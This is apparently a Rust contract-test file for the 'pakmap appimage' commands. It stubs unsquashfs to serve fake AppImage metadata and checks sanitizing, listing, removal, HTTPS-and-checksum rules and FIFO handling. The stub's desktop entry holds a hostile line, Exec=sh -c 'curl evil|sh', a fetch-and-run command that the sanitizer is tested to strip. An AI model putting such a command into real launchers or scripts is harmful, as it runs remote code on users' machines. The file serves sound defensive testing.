#![allow(clippy::unwrap_used, clippy::expect_used)]
//! Hermetic `pakmap appimage …` contract tests (v0.11.1).
//!
//! `unsquashfs` is stubbed on PATH so the test never executes an AppImage or
//! needs squashfs-tools: the stub answers `-lls` with a realistic long listing
//! and `-cat` with the same metadata files a real type-2 image would contain,
//! including a hostile `Exec=` line that must be discarded by our sanitizer.

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::process::{Command, Output};

struct Fixture {
    data: tempfile::TempDir,
    bin: tempfile::TempDir,
}

fn write_exec(path: &Path, body: &str) {
    fs::write(path, body).unwrap();
    let mut perms = fs::metadata(path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(path, perms).unwrap();
}

impl Fixture {
    fn new() -> Self {
        let data = tempfile::tempdir().unwrap();
        let bin = tempfile::tempdir().unwrap();
        write_exec(
            &bin.path().join("unsquashfs"),
            r#"#!/usr/bin/env bash
set -euo pipefail
mode=""
args=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    -o) shift 2 ;;
    -lls) mode=list; shift ;;
    -cat) mode=cat; shift ;;
    -d) shift 2 ;;
    -*) shift ;;
    *) args+=("$1"); shift ;;
  esac
done
[[ ${#args[@]} -gt 0 ]] || exit 2
if [[ $mode == list ]]; then
  for a in "${args[@]:1}"; do
    if [[ $a == "App.png" ]]; then
      printf -- '-rw-r--r-- root/root                 8 2026-10-29 08:58 squashfs-root/App.png\n'
      exit 0
    fi
  done
  printf -- 'lrwxrwxrwx root/root                 7 2026-10-29 08:58 squashfs-root/.DirIcon -> App.png\n'
  printf -- '-rw-r--r-- root/root               231 2026-10-29 08:58 squashfs-root/App.desktop\n'
  exit 0
fi
if [[ $mode == cat ]]; then
  path="${args[$((${#args[@]}-1))]}"
  case "$path" in
    App.desktop)
      cat <<'EOF'
[Desktop Entry]
Type=Application
Name=Firefox Browser
Exec=sh -c 'curl evil|sh'
Icon=firefox
EOF
      ;;
    App.png) printf '\x89PNG\r\n\x1a\nFAKE' ;;
    *) exit 3 ;;
  esac
  exit 0
fi
exit 2
"#,
        );
        Self { data, bin }
    }

    fn appimage(&self) -> std::path::PathBuf {
        // Realistic type-2 layout: section header table at 4096 (two 64-byte
        // entries), so the squashfs starts at 4224 — far past the first 128
        // bytes, which is exactly what the old fixture failed to model.
        let mut bytes = vec![0u8; 4228];
        bytes[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
        bytes[4] = 2; // ELF64
        bytes[5] = 1; // little endian
        bytes[8..11].copy_from_slice(&[0x41, 0x49, 0x02]); // AppImage type 2
        bytes[0x28..0x30].copy_from_slice(&4096u64.to_le_bytes());
        bytes[0x3a..0x3c].copy_from_slice(&64u16.to_le_bytes());
        bytes[0x3c..0x3e].copy_from_slice(&2u16.to_le_bytes());
        bytes[4224..4228].copy_from_slice(b"hsqs");
        let path = self.data.path().join("Source.AppImage");
        fs::write(&path, bytes).unwrap();
        path
    }

    fn run(&self, args: &[&str]) -> Output {
        Command::new(env!("CARGO_BIN_EXE_pakmap"))
            .args(args)
            .env("XDG_DATA_HOME", self.data.path())
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    self.bin.path().display(),
                    std::env::var("PATH").unwrap()
                ),
            )
            .output()
            .unwrap()
    }
}

fn text(out: &Output) -> String {
    format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    )
}

#[test]
fn integrate_list_and_remove_roundtrip() {
    let fx = Fixture::new();
    let appimage = fx.appimage();
    let out = fx.run(&["appimage", "integrate", appimage.to_str().unwrap()]);
    assert!(out.status.success(), "integrate failed: {}", text(&out));
    assert!(text(&out).contains("Firefox Browser"));

    let desktop = fx
        .data
        .path()
        .join("applications/pakmap-firefox-browser.desktop");
    assert!(desktop.is_file());
    let rendered = fs::read_to_string(&desktop).unwrap();
    assert!(rendered.contains("Exec=\""), "{rendered}");
    assert!(
        !rendered.contains("curl"),
        "hostile Exec survived: {rendered}"
    );
    assert!(rendered.contains("Terminal=false"));
    assert!(
        fx.data
            .path()
            .join("icons/hicolor/256x256/apps/pakmap-firefox-browser.png")
            .is_file()
    );

    let out = fx.run(&["appimage", "list", "--json"]);
    assert!(out.status.success());
    let entries: serde_json::Value = serde_json::from_slice(&out.stdout).unwrap();
    assert_eq!(entries.as_array().unwrap().len(), 1);
    assert_eq!(entries[0]["id"], "firefox-browser");

    let out = fx.run(&["appimage", "remove", "firefox-browser", "--yes"]);
    assert!(out.status.success(), "remove failed: {}", text(&out));
    assert!(!desktop.exists());
    let listed = fx.run(&["appimage", "list"]);
    assert!(String::from_utf8_lossy(&listed.stdout).contains("No integrated AppImages"));
}

#[test]
fn remove_without_yes_in_a_non_interactive_shell_is_refused() {
    let fx = Fixture::new();
    let appimage = fx.appimage();
    let out = fx.run(&["appimage", "integrate", appimage.to_str().unwrap()]);
    assert!(out.status.success(), "integrate failed: {}", text(&out));

    let out = fx.run(&["appimage", "remove", "firefox-browser"]);
    assert!(!out.status.success());
    assert!(text(&out).contains("pass --yes"), "{}", text(&out));
    let listed = fx.run(&["appimage", "list", "--json"]);
    let entries: serde_json::Value = serde_json::from_slice(&listed.stdout).unwrap();
    assert_eq!(entries.as_array().unwrap().len(), 1, "entry must survive");
}

#[test]
fn install_requires_a_checksum_and_https() {
    let fx = Fixture::new();
    let out = fx.run(&["appimage", "install", "https://example.org/App.AppImage"]);
    assert!(!out.status.success());
    assert!(text(&out).contains("sha256 is required"));

    let out = fx.run(&[
        "appimage",
        "install",
        "http://example.org/App.AppImage",
        "--sha256",
        &"ab".repeat(32),
    ]);
    assert!(!out.status.success());
    assert!(text(&out).contains("only https"));
}

#[test]
fn refuses_non_appimage_and_unknown_id() {
    let fx = Fixture::new();
    let junk = fx.data.path().join("junk.bin");
    fs::write(&junk, vec![0u8; 128]).unwrap();
    let out = fx.run(&["appimage", "integrate", junk.to_str().unwrap()]);
    assert!(!out.status.success());
    assert!(text(&out).contains("not an ELF file"), "{}", text(&out));

    let out = fx.run(&["appimage", "remove", "nope", "--yes"]);
    assert!(!out.status.success());
    assert!(text(&out).contains("not integrated"));
}

#[test]
fn refuses_a_fifo_source_without_hanging() {
    let fx = Fixture::new();
    let fifo = fx.data.path().join("pipe.AppImage");
    let status = Command::new("mkfifo").arg(&fifo).status().unwrap();
    assert!(status.success(), "mkfifo unavailable");
    let out = fx.run(&["appimage", "integrate", fifo.to_str().unwrap()]);
    assert!(!out.status.success());
    assert!(text(&out).contains("not a regular file"), "{}", text(&out));
}
